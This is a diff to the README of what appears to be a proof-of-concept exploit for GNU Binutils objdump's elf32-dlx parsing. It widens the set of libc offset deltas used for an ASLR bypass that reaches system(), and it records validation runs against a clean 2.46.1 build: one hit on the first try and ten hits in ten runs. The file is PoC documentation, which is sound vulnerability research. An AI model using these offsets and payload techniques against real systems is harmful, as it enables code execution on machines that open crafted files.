@@ -28,6 +28,7 @@ elf32-dlx
 - `dlx_chain_builder.py` - small builder used by the generator
 - `docs/aslr-bypass-analysis.md` - notes on why this is profile-dependent
 - `tools/search_pointer_transform.py` - Z3 sanity check for fixed pointer transforms
+- `tools/aslr_delta_coverage.py` - lists the libc low-32 delta coverage used by the generator
 
 The payload files are named `.bin` because they are raw binary files, but the file format inside is ELF/DLX.
 
@@ -43,22 +44,31 @@ relative offsets observed in the target process:
 ```text
 layout=wsl2404 off_io=-0x3690 off_sec=0xbb0 rbase=0x220
 buf_delta=0x702fff00 or 0x6f300000
-system_delta=0x7042e500 or 0x7043e4ff
+system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff
 
 layout=gnu2461 off_io=-0x3690 off_sec=0xbb8 rbase=0x190 sec_size_offset=0x40
 buf_delta=0x702fff00 or 0x6f300000
-system_delta=0x7042e500 or 0x7043e4ff
+system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff
 ```
 
-That is an ASLR-on relative-delta strategy, not a universal single-shot info-leak bypass. A miss can still happen, so the runner keeps the retry loop.
+That is an ASLR-on relative-delta strategy, not a universal single-shot info-leak bypass. The six `system_delta` values cover every page-aligned low-32-bit libc base for the documented `_IO_2_1_stderr_` and `system` offsets. A miss can still happen if the heap/libio profile or libc build does not match, so the runner keeps the retry loop.
 
 More detail is in `docs/aslr-bypass-analysis.md`.
 
-The `gnu2461` profile was validated with the existing runner:
+The expanded `gnu2461` profile was validated with the existing runner against a
+clean GNU Binutils 2.46.1 `dlx-elf` objdump build:
 
 ```text
-HIT try=1 payload=.../payloads/dlx_calc_aslr_gnu2461_f05_b702fff00_s7042e500.bin
-CALC_HELPER_RAN 2026-06-25T11:14:27Z
+HIT try=1 payload=payloads/dlx_calc_aslr_gnu2461_f06_b702fff00_s7042e500.bin
+CALC_HELPER_RAN 2026-06-25T11:19:07Z
+```
+
+A ten-run one-sweep stability pass against the same clean build also hit every
+run:
+
+```text
+hits=10/10
+CALC_HELPER_RAN 2026-06-25T11:19:31Z
 ```
 
 So a plain crash like this does not always mean the PoC failed:
